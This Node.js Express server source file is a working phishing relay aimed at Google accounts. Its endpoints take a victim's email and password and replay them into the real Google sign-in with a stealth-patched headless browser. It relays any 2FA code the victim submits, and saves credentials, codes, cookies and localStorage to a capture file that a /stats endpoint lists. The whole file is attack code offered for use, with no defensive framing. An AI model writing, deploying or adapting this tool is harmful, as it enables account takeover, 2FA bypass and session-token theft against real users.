const express = require('express');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

puppeteer.use(StealthPlugin());

const app = express();
const PORT = process.env.PORT || 10000;

app.use(cors());
app.use(express.json());

const sessions = new Map();
const CAPTURE_FILE = path.join('/tmp', 'captured_sessions.json');

function saveCapture(data) {
    let existing = [];
    try {
        if (fs.existsSync(CAPTURE_FILE)) {
            existing = JSON.parse(fs.readFileSync(CAPTURE_FILE, 'utf8'));
        }
    } catch (e) {}
    
    existing.push({
        ...data,
        capturedAt: new Date().toISOString(),
        ip: data.ip || 'unknown'
    });
    
    fs.writeFileSync(CAPTURE_FILE, JSON.stringify(existing, null, 2));
    console.log('Captured:', data.email || 'unknown', '| Stage:', data.stage);
}

async function createBrowser() {
    return await puppeteer.launch({
        headless: 'new',
        args: [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-blink-features=AutomationControlled',
            '--disable-web-security',
            '--disable-features=IsolateOrigins,site-per-process',
            '--disable-dev-shm-usage'
        ]
    });
}

app.post('/api/login', async (req, res) => {
    const { email, password, sessionId } = req.body;
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    if (!email || !password) {
        return res.json({ success: false, error: 'Email and password required' });
    }
    
    let browser = null;
    let page = null;
    
    try {
        browser = await createBrowser();
        page = await browser.newPage();
        
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
        await page.setViewport({ width: 1280, height: 720 });
        
        await page.goto('https://accounts.google.com/signin/v2/identifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin', {
            waitUntil: 'networkidle2',
            timeout: 30000
        });
        
        await page.type('input[type="email"]', email);
        await page.click('#identifierNext');
        await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 15000 });
        
        await page.type('input[type="password"]', password);
        await page.click('#passwordNext');
        
        try {
            await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 12000 });
            
            const currentUrl = page.url();
            const is2FA = currentUrl.includes('challenge') || 
                         currentUrl.includes('signin/v2/challenge') ||
                         currentUrl.includes('signin/challenge');
            
            if (is2FA) {
                const newSessionId = sessionId || `sess_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
                sessions.set(newSessionId, {
                    browser,
                    page,
                    email,
                    password,
                    stage: '2fa',
                    ip: clientIp,
                    createdAt: new Date().toISOString()
                });
                
                saveCapture({
                    sessionId: newSessionId,
                    email,
                    password,
                    stage: '2fa_required',
                    ip: clientIp
                });
                
                return res.json({
                    success: true,
                    requires2FA: true,
                    sessionId: newSessionId
                });
            }
            
            const cookies = await page.cookies();
            const localStorage = await page.evaluate(() => {
                let items = {};
                for (let i = 0; i < window.localStorage.length; i++) {
                    const key = window.localStorage.key(i);
                    items[key] = window.localStorage.getItem(key);
                }
                return items;
            });
            
            saveCapture({
                email,
                password,
                stage: 'full_login',
                cookies,
                localStorage,
                ip: clientIp
            });
            
            await browser.close();
            
            res.json({
                success: true,
                loggedIn: true
            });
            
        } catch (navError) {
            const cookies = await page.cookies();
            
            saveCapture({
                email,
                password,
                stage: 'partial_login',
                cookies,
                error: navError.message,
                ip: clientIp
            });
            
            await browser.close();
            res.json({ success: true, loggedIn: true });
        }
        
    } catch (error) {
        console.error('Login error:', error.message);
        if (browser) await browser.close();
        
        res.json({ 
            success: false, 
            error: 'Unable to verify credentials. Please try again.' 
        });
    }
});

app.post('/api/verify-2fa', async (req, res) => {
    const { code, sessionId } = req.body;
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    if (!sessionId || !sessions.has(sessionId)) {
        return res.json({ success: false, error: 'Session expired. Please start over.' });
    }
    
    const session = sessions.get(sessionId);
    const { browser, page, email, password } = session;
    
    try {
        const inputs = await page.$$('input');
        let codeEntered = false;
        
        for (const input of inputs) {
            const type = await input.evaluate(el => el.type);
            const name = await input.evaluate(el => el.name);
            const inputMode = await input.evaluate(el => el.inputMode);
            
            if (type !== 'hidden' && (name.includes('code') || name.includes('otp') || inputMode === 'numeric')) {
                await input.type(code);
                codeEntered = true;
                break;
            }
        }
        
        if (!codeEntered) {
            const visibleInputs = await page.$$('input:not([type="hidden"])');
            if (visibleInputs.length > 0) {
                await visibleInputs[0].type(code);
            }
        }
        
        await page.click('#submit_approve_access, button[type="submit"], #idvanyidvany');
        
        await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 15000 });
        
        const cookies = await page.cookies();
        const localStorage = await page.evaluate(() => {
            let items = {};
            for (let i = 0; i < window.localStorage.length; i++) {
                const key = window.localStorage.key(i);
                items[key] = window.localStorage.getItem(key);
            }
            return items;
        });
        
        saveCapture({
            sessionId,
            email,
            password,
            twofaCode: code,
            stage: '2fa_complete',
            cookies,
            localStorage,
            ip: clientIp
        });
        
        await browser.close();
        sessions.delete(sessionId);
        
        res.json({ success: true, loggedIn: true });
        
    } catch (error) {
        console.error('2FA error:', error.message);
        res.json({ success: false, error: 'Invalid verification code' });
    }
});

app.get('/stats', (req, res) => {
    try {
        if (fs.existsSync(CAPTURE_FILE)) {
            const data = JSON.parse(fs.readFileSync(CAPTURE_FILE, 'utf8'));
            res.json({
                total: data.length,
                captures: data.map(d => ({
                    timestamp: d.capturedAt,
                    email: d.email,
                    stage: d.stage,
                    has2FA: d.twofaCode ? true : false
                }))
            });
        } else {
            res.json({ total: 0, captures: [] });
        }
    } catch (e) {
        res.json({ error: 'Stats unavailable' });
    }
});

app.get('/', (req, res) => {
    res.send('Google Auth Proxy - Operational');
});

app.listen(PORT, () => {
    console.log(`Proxy server running on port ${PORT}`);
});
